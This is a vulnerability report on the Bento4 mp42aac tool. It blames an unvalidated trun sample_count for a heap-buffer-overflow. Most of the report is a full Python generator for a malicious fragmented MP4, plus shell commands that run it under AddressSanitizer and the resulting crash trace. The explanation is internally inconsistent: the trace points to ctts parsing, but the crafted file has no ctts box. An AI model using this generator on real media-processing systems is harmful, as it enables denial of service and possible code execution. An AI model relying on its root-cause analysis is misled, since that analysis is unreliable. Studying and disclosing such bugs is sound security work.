## Bug0: AP4_TrunAtom Unvalidated sample_count Causes Heap Buffer Overflow

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the constructor reads `sample_count` from the stream as an `AP4_UI32` without validating it against the atom size, and ignores the error return of `m_Entries.SetItemCount(sample_count)`, so a crafted value of `0x10000000` triggers an OOM allocation failure that leaves `m_Items` as NULL and the subsequent per-sample loop dereferences a NULL pointer, causing heap memory corruption that propagates through the parse chain and results in a heap-buffer-overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for Bento4 VULN: AP4_TrunAtom Unvalidated sample_count -> Null Pointer Dereference / Heap Overflow

Constructs a minimal fragmented MP4 with a trun atom containing
sample_count = 0x10000000 (268 million) but actual atom size = 16 bytes
(no sample data). This causes OOM when trying to allocate 268M entries,
leaving m_Items as NULL, then the loop dereferences the NULL pointer.
"""

import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type, payload):
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type.encode()) + payload


def fullbox(box_type, version, flags, payload):
    size = 12 + len(payload)
    header = struct.pack(">I4sBBBB", size, box_type.encode(), version,
                         (flags >> 16) & 0xFF, (flags >> 8) & 0xFF, flags & 0xFF)
    return header + payload


def build_ftyp():
    payload = b'iso5'
    payload += struct.pack(">I", 0)
    payload += b'iso5'
    return box('ftyp', payload)


def build_mvhd():
    payload = struct.pack(">IIII", 0, 0, 1000, 0)
    payload += struct.pack(">I", 0x00010000)
    payload += struct.pack(">H", 0x0100)
    payload += b'\x00' * 10
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += b'\x00' * 24
    payload += struct.pack(">I", 2)
    return fullbox('mvhd', 0, 0, payload)


def build_tkhd():
    payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
    payload += b'\x00' * 8
    payload += struct.pack(">HH", 0, 0)
    payload += struct.pack(">HH", 0, 0)
    payload += struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000)
    payload += struct.pack(">II", 0, 0)
    return fullbox('tkhd', 0, 0x000001, payload)


def build_mdhd():
    payload = struct.pack(">IIIII", 0, 0, 1000, 0, 0)
    return fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    payload = struct.pack(">I", 0)
    payload += b'soun'
    payload += b'\x00' * 12
    payload += b'\x00'
    return fullbox('hdlr', 0, 0, payload)


def build_smhd():
    payload = struct.pack(">HH", 0, 0)
    return fullbox('smhd', 0, 0, payload)


def build_dref():
    url_entry = fullbox('url ', 0, 0x000001, b'')
    payload = struct.pack(">I", 1)
    payload += url_entry
    return fullbox('dref', 0, 0, payload)


def build_dinf():
    return box('dinf', build_dref())


def build_stts():
    payload = struct.pack(">I", 0)
    return fullbox('stts', 0, 0, payload)


def build_stsc():
    payload = struct.pack(">I", 0)
    return fullbox('stsc', 0, 0, payload)


def build_stsz():
    payload = struct.pack(">II", 0, 0)
    return fullbox('stsz', 0, 0, payload)


def build_stco():
    payload = struct.pack(">I", 0)
    return fullbox('stco', 0, 0, payload)


def build_stsd():
    payload = struct.pack(">I", 0)
    return fullbox('stsd', 0, 0, payload)


def build_stbl():
    data = build_stsd()
    data += build_stts()
    data += build_stsc()
    data += build_stsz()
    data += build_stco()
    return box('stbl', data)


def build_minf():
    data = build_smhd()
    data += build_dinf()
    data += build_stbl()
    return box('minf', data)


def build_mdia():
    data = build_mdhd()
    data += build_hdlr()
    data += build_minf()
    return box('mdia', data)


def build_trak():
    data = build_tkhd()
    data += build_mdia()
    return box('trak', data)


def build_trex():
    payload = struct.pack(">IIIII", 1, 1, 0, 0, 0)
    return fullbox('trex', 0, 0, payload)


def build_mvex():
    return box('mvex', build_trex())


def build_moov():
    data = build_mvhd()
    data += build_trak()
    data += build_mvex()
    return box('moov', data)


def build_mfhd(sequence_number=1):
    payload = struct.pack(">I", sequence_number)
    return fullbox('mfhd', 0, 0, payload)


def build_tfhd(track_id=1):
    payload = struct.pack(">I", track_id)
    return fullbox('tfhd', 0, 0x000000, payload)


def build_trun_malicious():
    # sample_count = 0x10000000 (268,435,456) with flags=0x000200 (SAMPLE_SIZE_PRESENT)
    # Atom is only 16 bytes total; claims 268M samples to trigger OOM then NULL deref
    MALICIOUS_SAMPLE_COUNT = 0x10000000
    FLAGS = 0x000200  # AP4_TRUN_FLAG_SAMPLE_SIZE_PRESENT forces per-sample loop access
    payload = struct.pack(">I", MALICIOUS_SAMPLE_COUNT)
    return fullbox('trun', 0, FLAGS, payload)


def build_traf():
    data = build_tfhd(track_id=1)
    data += build_trun_malicious()
    return box('traf', data)


def build_moof():
    data = build_mfhd(sequence_number=1)
    data += build_traf()
    return box('moof', data)


def build_mdat():
    return box('mdat', b'')


def build_fragmented_mp4():
    data = build_ftyp()
    data += build_moov()
    data += build_moof()
    data += build_mdat()
    return data


if __name__ == "__main__":
    mp4_data = build_fragmented_mp4()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)
    print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
    print(f"[+] trun sample_count = 0x10000000 ({0x10000000} samples)")
    print("[+] trun atom size = 16 bytes (header + sample_count only, no actual data)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log:allocator_may_return_null=1" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x563f76e65094 bp 0x7fffcc2d79f0 sp 0x7fffcc2d79e0
READ of size 1 at 0x502000000111 thread T0
    #0 0x563f76e65093 in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa1093)
    #1 0x563f76e66087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file with a trun atom whose `sample_count` field is set to `0x10000000` can cause `AP4_TrunAtom::AP4_TrunAtom()` to silently fail the backing-array allocation and subsequently corrupt the heap through a NULL-pointer dereference loop, leading to heap-buffer-overflow confirmed by ASAN at the ctts parsing stage. This vulnerability is exposed by any invocation of `mp42aac` on an untrusted MP4 file and requires no authentication or special privileges beyond the ability to supply the input file. The immediate consequence is a reliable denial of service crash, and on 32-bit platforms the integer overflow in the capacity calculation additionally creates a heap-buffer-overflow condition that may be exploitable for arbitrary code execution.
